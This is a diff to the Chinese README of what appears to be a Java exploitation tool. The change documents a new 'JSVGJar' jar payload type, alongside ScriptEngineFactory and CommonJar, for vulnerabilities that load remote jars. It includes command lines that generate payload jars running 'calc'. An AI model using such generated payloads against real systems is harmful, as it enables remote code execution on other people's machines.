@@ -2796,17 +2796,17 @@ rmi://127.0.0.1:1234/Basic
 
 #### jarPayload Jar包类型Payload输出
 
-描述：有些漏洞利用是远程jar包加载，工具支持ScriptEngineFactory和CommonJar俩种jar包类型输出
+描述：有些漏洞利用是远程jar包加载，工具支持ScriptEngineFactory和JSVGJar和CommonJar三种jar包类型输出
 
 工具：使用方式如下：必须带有writeToFile参数，参数值为目录名
 
-生成ScriptEngineFactory类型的jar包
+生成ScriptEngineFactory类型的jar包：
 
 ```python
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -jarPayload "ScriptEngineFactory" -writeToFile "/tmp/"
 ```
 
-生成类型的jar包
+生成JSVGJar类型的jar包：
 
 ```python
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -jarPayload "JSVGJar" -writeToFile "/tmp/"
